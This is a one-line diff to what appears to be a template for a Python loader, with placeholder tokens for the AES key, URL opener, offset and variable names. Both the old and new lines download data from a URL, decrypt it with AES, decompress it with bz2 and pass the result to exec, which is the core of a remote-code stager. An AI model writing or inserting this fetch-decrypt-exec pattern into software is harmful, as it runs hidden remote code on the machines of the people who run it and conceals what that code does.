@@ -1,1 +1,1 @@
-exec(***AESVAR***.new("***AESKEY***").decrypt(***BZ2***(***URLO***(url).read()[***OFFSET***:])).rstrip('{'))
+exec(***AESVAR***.new("***AESKEY***").decrypt(***URLO***(url).read()[***OFFSET***:]).rstrip('{').decode('bz2'))
